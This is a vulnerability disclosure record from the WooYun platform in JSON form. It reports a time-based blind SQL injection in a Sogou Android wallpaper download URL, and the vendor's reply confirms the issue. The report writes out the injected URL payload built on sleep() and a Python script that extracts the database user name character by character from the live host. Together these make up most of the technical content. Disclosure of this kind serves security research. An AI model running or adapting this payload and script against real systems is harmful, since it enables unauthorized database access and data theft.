{"id": 88215, "wybug_id": "wooyun-2016-0208114", "wybug_title": "搜狗一处注入附验证脚本（时间盲注\\绕过过滤）                                      ", "wybug_corp": "搜狗", "wybug_author": "sauce", "wybug_date": "2016-05-13 11:50", "wybug_open_date": "2016-06-30 08:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-30：\t细节向公众公开  简要描述： rt  详细说明：  注入点\nhttp://download.android.bizhi.sogou.com/client.php?clientid=69ce12b3194bd597e9ecff768e05c172&w=720&h=1184&v=2.5.5.71399&dv=6.0.1&dn=Moto+G+2014+LTE&dr=720x1184&r=0032-0032&j=56eae447a9e7d3b52edcc26946ba5198&i=d41d8cd98f00b204e9800998ecf8427e&n=unknown\n注入点w时间盲注sqlmap没跑出来 手测发现过滤了逗号   漏洞证明：  \nhttp://download.android.bizhi.sogou.com/client.php?clientid=69ce12b3194bd597e9ecff768e05c172&w=720' AND (SELECT * FROM (SELECT(case when (length(user())=23) then sleep(2) else sleep(0) end))lzRG) AND 'IgTp'='IgTp&h=1184&v=2.5.5.71399&dv=6.0.1&dn=Moto G 2014 LTE&dr=720x1184&r=0032-0032&j=56eae447a9e7d3b52edcc26946ba5198&i=d41d8cd98f00b204e9800998ecf8427e&n=WIFI\n可知用户名长度23运行截图\n\npython脚本\n#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport timepayloads='abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'#payloads='abcdefqrstuvwxyj'user=''print 'Start to retrive current user:'for i in range(1,23):    for payload in payloads:        starttime=time.time()        url = \"http://download.android.bizhi.sogou.com/client.php?clientid=69ce12b3194bd597e9ecff768e05c172&w=720' AND (SELECT * FROM (SELECT(case when (user() like '\"+user+payload+\"%') then sleep(2) else sleep(0) end))lzRG) AND 'IgTp'='IgTp&h=1184&v=2.5.5.71399&dv=6.0.1&dn=Moto G 2014 LTE&dr=720x1184&r=0032-0032&j=56eae447a9e7d3b52edcc26946ba5198&i=d41d8cd98f00b204e9800998ecf8427e&n=WIFI\"        response=requests.get(url)        if time.time() - starttime > 2:            user+=payload            print '\\n user is:',user,            break        else:            print '.',print '\\n[Done] current user is %s' %user\n   修复方案：  过滤   版权声明：转载请注明来源 sauce@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-05-16 08:08 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}